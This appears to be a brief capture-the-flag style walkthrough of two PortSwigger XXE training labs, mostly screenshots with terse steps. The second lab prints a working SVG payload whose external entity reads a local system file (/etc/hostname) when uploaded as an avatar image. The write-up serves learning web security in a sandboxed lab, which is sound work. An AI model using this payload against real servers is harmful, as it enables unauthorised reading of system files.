## [Lab 8: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/fe23e892-d22d-42cc-bd3f-13e9c0942ff3)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/fd7ab000-d021-49a0-a72c-1cd77c5518d3)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/43d7463a-f54b-4f41-ab9d-bc2cdf41f7fb)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/f407871d-0795-4bf3-9b7e-23372496c710)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/296cf2f9-559d-4bb8-85e2-0116537460ee)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/a6bcbab1-143b-4d7c-8111-025bc06093b8)

sovle the lab

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/13b94d35-d614-49a9-9118-ab2742e915e3)

## [Lab 9: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4b15b285-7229-4586-a90a-8e5b4ad6254e)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/be982105-c55b-4a18-aa56-22deaaf79521)

creat

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/37b69809-150c-4523-9267-df8c2fe7adc9)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/e820be38-2657-48cc-9394-4025377cf620)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/32f1a1c6-6d25-4bd3-840d-e148354164ad)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/8eb66ef0-f87e-476b-b156-6e05894931f6)

picture details:

![avatars](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/2f166e57-63d4-448e-b161-e8bc847f8a06)

submit and solve the lab

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/987a3fff-45c6-4996-b154-5350a161ef16)
